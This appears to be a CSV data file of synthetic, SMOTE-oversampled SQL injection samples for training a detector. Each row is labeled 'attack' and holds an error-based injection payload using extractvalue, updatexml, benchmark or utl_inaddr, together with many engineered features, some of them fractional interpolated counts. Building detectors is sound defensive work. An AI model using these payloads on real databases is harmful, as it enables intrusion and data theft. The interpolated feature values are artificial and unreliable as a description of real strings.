id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000401,attack,error,"1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000256,1.0920791494721862,175.58356187082686,34.58753428062403,3.87569472289805,57.175068561248054,32.0,66.35013712249611,20.058356187082683,0.32571249702149974,0.18284442326399808,0.37715835914700235,0.11428472056749986,0.0,0.0,2.0,0.0,0.0,1.0,0.0,13.058356187082685,2.7755575615628914e-17,0.0,4.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000402,attack,error,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000144,0.4392667952250477,142.70969301050752,25.741938602101502,3.6263272966005644,36.2258158063045,36.03224559159399,53.451631612609006,17.0,0.25375993378892236,0.2527380150790254,0.37435061134281494,0.11915143978923723,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.741938602101502,2.7755575615628914e-17,0.0,5.258061397898499,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000403,attack,error,"1' in boolean mode  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #",nearest_attack_euclidean,R000261,0.45064481510976145,161.82397171844374,29.0,3.839715394912241,46.82397171844375,39.0,56.0,20.0,0.28934731798255625,0.24100395303200267,0.3460569581997987,0.12359177078564239,1.0,0.0,0.0,0.0,0.0,1.0,0.0,11.0,2.7755575615628914e-17,0.0,6.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.8239717184437535,0.17602828155624656,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000404,attack,error,"1',  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000096,0.31087518517716073,140.33956800966916,27.0,3.5302690470843343,56.0,11.867913601933832,58.73582720386767,13.735827203867668,0.399091791377687,0.08454844606574054,0.41852926174253546,0.09783050081403696,0.8679136019338344,0.0,0.0,1.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,0.8679136019338345,2.0,0.8679136019338345,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000405,attack,error,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000083,0.6287329386373708,162.30152447667749,27.73015244766775,3.6916835993208097,39.190457343003246,36.079390209329006,62.30152447667749,24.73015244766775,0.2414218761496945,0.2227779483032482,0.38338816999678393,0.15241200555027337,4.0,0.0,0.0,0.0,0.0,2.0,0.0,11.460304895335499,2.0,0.0,5.2698475523322506,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000406,attack,error,"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""wvkp"" like ""wvkp",nearest_attack_euclidean,R000053,0.8401229344254301,166.42473486126812,29.542473486126813,3.8650577798710652,49.372579541619565,37.16989394450725,58.25484091676087,21.627420458380435,0.297204018316664,0.22318430877633513,0.34981181105767145,0.1297998618493294,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,11.084946972253624,2.7755575615628914e-17,0.0,5.542473486126812,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000407,attack,error,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'hofy' like 'hofy",nearest_attack_euclidean,R000202,0.7545734005673052,170.23469277331282,31.0,3.898680219821004,64.0,24.0,61.38775421865026,20.846938554662565,0.3762657332457551,0.14109964996715813,0.36023942426902383,0.12239519251806302,4.0,0.0,0.0,0.0,0.0,0.0,0.0,12.846938554662565,2.7755575615628914e-17,0.0,4.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000408,attack,error,"1""  )   where 5005  =  5005 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000181,0.26882531122376513,169.9002834806025,32.219943303879504,3.7681398705566016,54.0,32.0,63.120226784481986,20.780056696120496,0.3178815152556706,0.18837423126261962,0.37144862387754035,0.1222956296041694,0.0,1.0,2.0,0.0,0.0,1.0,0.0,12.780056696120496,2.7755575615628914e-17,0.0,4.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000409,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kird'  =  'kird",nearest_attack_euclidean,R000060,0.020056676344821587,161.0,28.94143549001277,3.891237917104552,45.0,39.0,55.0,22.0,0.2795031055900621,0.2422360248447205,0.3416149068322981,0.13664596273291926,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,2.7755575615628914e-17,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000410,attack,error,"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  # usus",nearest_attack_euclidean,R000264,0.20388778751049466,150.2512636873485,29.147207492629235,3.769626514554975,53.662433716831565,24.0,55.441622477887705,17.147207492629235,0.357014055485503,0.15985969400435174,0.3690055084661236,0.11412074204402166,0.07360374631461819,0.0,0.0,0.0,0.0,0.0,0.0,12.073603746314618,2.7755575615628914e-17,0.0,4.0,0.0,0.07360374631461825,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000411,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000003,0.16567588782219367,111.69396724243973,35.204021838373514,4.240113052204671,60.69396724243973,1.0,35.0,15.0,0.5433643782244779,0.008953639642657274,0.31337738749300537,0.13430459463985944,3.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,2.7755575615628914e-17,4.897989080813244,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000412,attack,error,"1'  )   as jrwx where 6087  =  6087 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000265,0.022122170651371103,175.0864509254849,32.0,3.904435322528442,45.037050396636396,46.95059947115148,61.09880105769705,22.0,0.25722428658601404,0.2681724242999597,0.3489487183247223,0.12565457078930398,1.0,0.0,2.0,0.0,0.0,2.0,0.0,11.01235013221213,2.7755575615628914e-17,0.0,5.9876498677878685,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000413,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'nhmz' like 'nhmz",nearest_attack_euclidean,R000067,0.5023613149026308,163.70793032147003,30.0,3.923691214483977,48.0,39.0,55.16634425717603,21.54158606429401,0.29341539880750567,0.23840001153109835,0.33664818271648067,0.13153640694491534,4.0,0.0,0.0,0.0,0.0,1.0,0.0,10.541586064294007,2.7755575615628914e-17,0.0,6.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000414,attack,error,"1%""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000284,0.06114771344254534,187.82443606644452,27.019507103728387,3.3796316116268965,39.01950710372839,35.0,84.84394317017292,28.960985792543227,0.20775925142367763,0.18635280927357784,0.45169928237087614,0.1541886569318684,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,15.960985792543228,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0195071037283856,0.9804928962716144,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000415,attack,error,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000259,0.32703031244518904,139.0,25.257279697935246,3.6335969188814143,35.22816090619427,36.02911879174098,50.485440604129515,17.257279697935246,0.2534400065193832,0.2592022934657624,0.36320460866280224,0.12415309135205212,0.0,1.0,0.0,0.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,5.257279697935244,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000416,attack,error,"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  -- btqa",nearest_attack_euclidean,R000236,0.042322458504330675,145.0,27.920415309912784,3.7717859915175755,37.079584690087216,38.89388707988371,50.053056460058144,18.973471769970928,0.2557212737247394,0.268233703999198,0.3451934928279872,0.13085152944807538,0.0,0.0,2.0,0.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,5.973471769970928,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000417,attack,error,"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  -- btqa",nearest_attack_euclidean,R000236,0.6718576182309306,145.0,26.73661450163307,3.7352723714687253,38.26338549836693,37.31548600217743,50.84225699891128,18.57887150054436,0.26388541723011677,0.2573481793253616,0.35063625516490543,0.12813014827961627,0.0,0.0,2.0,0.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,5.578871500544357,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000418,attack,error,"1   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000017,0.35958679978529834,154.94518905620146,31.547938166943478,3.703856811395442,50.45206183305652,23.150687277685506,62.64381450083044,18.698625444628988,0.3258157887259828,0.14949095968965348,0.4040588092640103,0.12063444232035339,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.698625444628986,2.7755575615628914e-17,0.0,4.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000419,attack,error,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,nearest_attack_euclidean,R000091,0.38025961816443055,161.14250129577528,31.0,3.765102651205061,52.0,24.0,61.71400103662021,23.428500259155054,0.32289791718282485,0.14902980793053452,0.3827165377945033,0.14535573709213734,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,12.428500259155053,2.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000420,attack,error,"1%""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000301,1.2330364138567314,178.55771546498903,27.55771546498903,3.513398191565655,38.23086185995612,36.76913814004388,76.11543092997806,27.44228453501097,0.21407995902117208,0.2059555484838754,0.4262669652144221,0.1536975272805304,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,14.0,2.0,0.0,5.442284535010969,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.557715464989031,0.442284535010969,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000421,attack,error,"1'  )   where 1323  =  1323 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000057,0.3574229021320616,168.67198533168624,29.33399816646078,3.7596623452710185,43.00398899876468,43.0,61.66799633292156,21.0,0.2547123243039676,0.25505832401113043,0.3656659841445824,0.1245633675403195,1.0,0.0,2.0,0.0,0.0,2.0,0.0,11.0,2.7755575615628914e-17,0.0,5.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000422,attack,error,"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R000227,0.09720491699997237,138.03713798704757,25.0,3.648975381118827,33.11141396114269,38.851448051809754,49.07427597409513,17.0,0.23986808325852996,0.28146446927613855,0.3555119551172869,0.1231554923480446,0.0,0.037137987047562326,0.0,0.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,5.962862012952438,1.0,0.0,0.037137987047562576,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000423,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",nearest_attack_euclidean,R000242,0.28032422419416364,168.8063102062871,28.761262041257417,3.73903458022888,46.64189306188612,35.477475917485165,63.80631020628708,22.88063102062871,0.27629504561857166,0.21040257532178053,0.37774494748750526,0.13555743157214256,4.0,0.0,0.0,0.0,0.0,2.0,0.0,11.761262041257417,2.7755575615628914e-17,0.0,5.119368979371291,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000424,attack,error,"1 where 7757  =  7757 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000307,0.5769626060796502,164.43904649136056,30.529084075593932,3.83502597070181,41.3808783401727,45.941831848812136,57.11633630237573,20.0,0.25113152707948677,0.2800742394004715,0.34702586519803175,0.12176836832201002,0.0,0.0,2.0,0.0,0.0,2.0,0.0,10.264542037796966,2.7755575615628914e-17,0.0,5.735457962203034,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000425,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",nearest_attack_euclidean,R000225,0.6869104443902592,166.44268383412734,27.355731616587267,3.6961018637738525,47.0,35.0,62.15414706730188,22.28853676682547,0.28261742131602996,0.21045978183108613,0.37306729971408237,0.1338554971388015,4.0,0.0,0.0,0.0,0.0,2.0,0.0,11.28853676682547,2.7755575615628914e-17,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000426,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",nearest_attack_euclidean,R000225,0.16437093968136374,171.07951727036317,27.07710837645451,3.6427256505996737,46.76867487063646,35.30843350581805,65.77108376454512,23.231325129363537,0.2735913496259952,0.20635072223549736,0.3843003714002258,0.13575755673828158,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.154216752909026,2.7755575615628914e-17,0.0,5.077108376454513,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000427,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000069,1.0033393272074216,170.3874944360345,27.38749443603451,3.4618029683129783,43.38749443603451,32.0,73.0,22.0,0.2546340486197586,0.18780874365486397,0.4284386964626584,0.12911851126271898,1.0,0.0,0.0,0.0,1.0,1.0,0.0,14.0,2.7755575615628914e-17,0.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.3874944360345067,0.6125055639654933,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000428,attack,error,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""gknn"" like ""gknn",nearest_attack_euclidean,R000041,0.5795083119751466,164.15597166645446,29.315597166645446,3.8671509869096465,50.05320850006366,36.262388666581785,56.89358299987268,20.94679149993634,0.30538709140681675,0.2207615258070452,0.3463836555637102,0.12746772722242786,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,10.631194333290892,2.7755575615628914e-17,0.0,5.315597166645446,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000429,attack,error,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,nearest_attack_euclidean,R000088,0.2907227773872254,154.11360214781553,27.0,3.761925115355343,36.11360214781553,39.0,55.0,24.0,0.23432781958283336,0.25306114437516525,0.35688110104189974,0.15572993500010168,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1136021478155294,0.8863978521844706,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
